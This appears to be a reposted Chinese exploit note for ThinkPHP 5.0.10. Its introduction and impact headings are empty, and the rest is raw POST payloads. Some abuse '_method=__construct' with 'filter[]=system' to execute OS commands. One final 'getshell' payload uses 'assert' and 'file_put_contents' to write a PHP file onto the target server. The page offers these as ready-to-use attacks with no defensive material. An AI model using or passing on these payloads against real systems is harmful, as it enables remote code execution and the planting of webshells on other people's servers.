# Thinkphp 5.0.10

> 原文：[https://www.zhihuifly.com/t/topic/3149](https://www.zhihuifly.com/t/topic/3149)

# Thinkphp 5.0.10

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

post提交

```
http://www.0-sec.org/public/index.php?s=index/index/index `s=whoami&_method=__construct&method&filter[]=system

s=whoami&_method=__construct&method=POST&filter[]=system

s=whoami&_method=__construct&method=GET&filter[]=system

_method=__construct&method=GET&filter[]=system&get[]=whoami

c=system&f=calc&_method=filter` 
```

> getshell

```
POST `s=file_put_contents(‘zerosec.php’,’<?php phpinfo();’)&_method=__construct&method=POST&filter[]=assert` 
```